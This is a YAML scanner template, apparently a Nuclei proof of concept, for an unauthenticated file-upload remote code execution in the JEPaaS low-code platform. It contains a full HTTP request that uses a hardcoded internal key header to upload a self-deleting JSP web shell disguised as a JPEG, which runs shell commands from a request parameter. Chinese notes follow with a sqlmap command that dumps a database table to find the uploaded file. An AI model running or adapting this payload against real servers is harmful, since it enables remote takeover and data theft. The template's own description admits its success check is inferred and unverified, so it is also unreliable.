id: poc-gkh4fg5060achnh4
info:
  name: JEPaaS 低代码平台 documentfile 文件上传致RCE漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,file-upload,2024
http:
- raw:
  - 'POST /je/document/file?bucket=webroot HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0

    Accept: application/json, text/javascript, */*; q=0.01

    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,

    internalRequestKey: schedule_898901212

    Content-Type: multipart/form-data; boundary=----21909179191068471382830692394

    Connection: close

    ------21909179191068471382830692394

    Content-Disposition: form-data; name="files"; filename="rce.jsp"

    Content-Type: image/jpeg

    <% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>

    ------21909179191068471382830692394--


    文件上传后没有回显路径，需利用SQL注入 寻找上传路径，文件默认是上传至数据库: jepaas的 je_document_file表中（需根据实际环境调整）


    python3 sqlmap.py -r 注入数据包.txt --level 3 -D "jepaas" -T "je_document_file" --dump --fresh-queries

    找上传时间一致的文件


    RCE'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
